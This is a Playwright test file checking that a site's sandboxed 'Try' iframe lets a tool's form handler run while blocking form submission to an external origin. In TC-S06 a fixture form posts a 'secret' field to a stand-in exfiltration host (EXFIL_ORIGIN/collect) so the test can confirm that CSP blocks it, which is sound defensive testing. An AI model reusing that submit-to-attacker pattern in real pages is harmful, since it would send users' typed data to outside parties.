import { readFile, writeFile } from 'node:fs/promises';
import { dirname, join } from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';

import { expect, test } from '../../fixtures/test-options';
import { EXFIL_ORIGIN } from '../../support/policy';
import { publishToDisk } from '../../support/publish';

/**
 * TC-S05/TC-S06 — the Try page runs a published tool inside a sandboxed frame,
 * and that frame is a second enforcement layer with different rules from the
 * downloaded copy. A tool can therefore be dead in one and fine in the other,
 * which is exactly what happened: `villa-prisma` worked when downloaded and did
 * nothing at https://mimawsi.com/run/, because the sandbox suppressed the
 * `submit` event before the tool's own `preventDefault` handler could see it.
 *
 * The sandbox value is read out of the page rather than restated here (RULE-45).
 * A second copy would let the frame and its regression test drift apart, and the
 * whole point of this file is that the frame's attributes are load-bearing.
 *
 * DEVIATION, deliberate: these two locate *inside* the frame, which AGENTS.md
 * forbids. That rule protects against asserting on third-party content whose
 * roles are not ours — catalogue tools. These fixtures are authored here, in this
 * spec, minimal, and their roles are a contract this file owns. The property
 * under test is "the tool's own submit handler ran", which has no observable
 * signal at the boundary: a suppressed event produces no request, no violation
 * and no navigation, which is indistinguishable from a tool that did nothing.
 * If a boundary-only oracle for that is ever found, take it and delete this note.
 */

const RUN_PAGE = new URL('../../../packages/site/src/pages/run/[id].astro', import.meta.url);

async function frameSandbox(): Promise<string> {
  const source = await readFile(RUN_PAGE, 'utf8');
  const sandbox = source.match(/sandbox="([^"]+)"/)?.[1];
  if (!sandbox) {
    throw new Error('No sandbox attribute found on the Try frame — the test cannot verify it.');
  }
  return sandbox;
}

/** Publishes a tool and returns a `file://` host page framing it exactly as the Try page does. */
async function publishFramed(toolHtml: string): Promise<string> {
  const toolUrl = await publishToDisk(toolHtml);
  const host = join(dirname(fileURLToPath(toolUrl)), 'host.html');
  await writeFile(
    host,
    `<!doctype html>
      <html lang="en">
        <head><title>Try</title></head>
        <body>
          <iframe
            title="Running fixture tool"
            src="tool.html"
            sandbox="${await frameSandbox()}"
            referrerpolicy="no-referrer"
            style="width: 640px; height: 320px"
          ></iframe>
        </body>
      </html>`,
    'utf8',
  );
  return pathToFileURL(host).href;
}

test.describe('a tool running in the Try frame', () => {
  test('TC-S05: a form handled with preventDefault works in the frame @csp', async ({ page }) => {
    // Fails without allow-forms, and fails silently: no exception, no violation,
    // just a control that does nothing.
    //
    // Falsifiability, measured by reverting the grant: this fails on Chromium and
    // Firefox and *passes on WebKit*, which dispatches the event regardless. So
    // on WebKit alone this case cannot fail and proves nothing — it is kept there
    // to catch the reverse regression, WebKit changing its mind and joining the
    // other two.
    await page.goto(
      await publishFramed(`<!doctype html>
        <html lang="en">
          <head><title>Fixture tool</title></head>
          <body>
            <p id="log">idle</p>
            <form id="f"><input id="i" aria-label="Command" /><button type="submit">Go</button></form>
            <script>
              document.getElementById('f').addEventListener('submit', (e) => {
                e.preventDefault();
                document.getElementById('log').textContent = 'handled: ' + document.getElementById('i').value;
              });
            </script>
          </body>
        </html>`),
    );

    const frame = page.frameLocator('iframe[title="Running fixture tool"]');
    await frame.getByLabel('Command').fill('north');
    await frame.getByRole('button', { name: 'Go' }).click();

    await expect(frame.getByText('handled: north')).toBeVisible();
  });

  test('TC-S06: a form in the frame still cannot submit to an external origin @csp @safety', async ({
    page,
    reached,
    violations,
  }) => {
    // The cost of allow-forms, and the proof it was not a cost: the grant lets
    // the event fire, the injected `form-action 'none'` denies the navigation.
    await page.goto(
      await publishFramed(`<!doctype html>
        <html lang="en">
          <head><title>Fixture tool</title></head>
          <body>
            <form method="GET" action="${EXFIL_ORIGIN}/collect">
              <input name="secret" value="user-typed-this" />
              <button type="submit">Send</button>
            </form>
          </body>
        </html>`),
    );

    const frame = page.frameLocator('iframe[title="Running fixture tool"]');
    // noWaitAfter for the reason given in TC-CSP13: the navigation is scheduled
    // and then refused, so waiting for it to settle waits forever.
    await frame.getByRole('button', { name: 'Send' }).click({ noWaitAfter: true });

    // The violation is the oracle that fails for the right reason. An empty
    // `reached` on its own would also be satisfied by EXFIL_ORIGIN simply not
    // resolving, which would make this pass with the protection removed — it did,
    // on two engines, before this assertion was added.
    await expect
      .poll(() => violations.map((v) => v.directive), { timeout: 3_000 })
      .toContain('form-action');

    // And the "and not" half: Chromium reports a blocked request to Playwright
    // before the CSP check runs, so only a response proves egress. Nothing may
    // respond, and the form is still sitting there un-navigated.
    expect(reached).toEqual([]);
    await expect(frame.getByRole('button', { name: 'Send' })).toBeVisible();
  });
});
